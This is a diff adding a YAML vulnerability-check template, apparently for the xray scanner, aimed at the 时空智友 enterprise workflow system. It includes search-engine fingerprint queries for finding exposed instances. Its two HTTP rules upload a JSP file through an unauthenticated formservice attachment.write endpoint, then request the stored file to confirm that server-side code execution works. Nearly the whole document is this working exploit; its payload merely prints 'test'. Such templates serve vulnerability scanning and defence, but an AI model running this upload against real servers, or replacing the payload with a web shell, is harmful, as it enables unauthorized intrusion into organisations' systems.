@@ -1,0 +1,46 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: icon_hash="-1700598274"
+    hunter-query: web.icon=="2464cbce5dd2681dd4fb62d055520d78"
+    quake-query: favicon:"2464cbce5dd2681dd4fb62d055520d78"  
+    zoomeye-query: app:"时空智友企业流程化管控系统"
+    threatbook-query: app=时空智友企业流程化管控系统
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-shikongzhiyou-upload
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /formservice?service=attachment.write&isattach=false&filename=top.jsp
+      follow_redirects: false
+      headers:
+        Accept-Encoding: gzip
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+      body: |
+        <%= "test" %>
+    expression: >-
+      response.status == 200 && response.body_string.contains("top.jsp") 
+    output:
+      search: |-
+        "root>(?P<filename>.*?)<".bsubmatch(response.body)
+      filename: search["filename"]
+
+  r1:
+    request:
+      method: GET
+      path: /form/temp/{{filename}}
+      follow_redirects: false
+    expression: >-
+      response.status == 200 && response.body_string.contains("test") 
+expression: r0() && r1()
+   
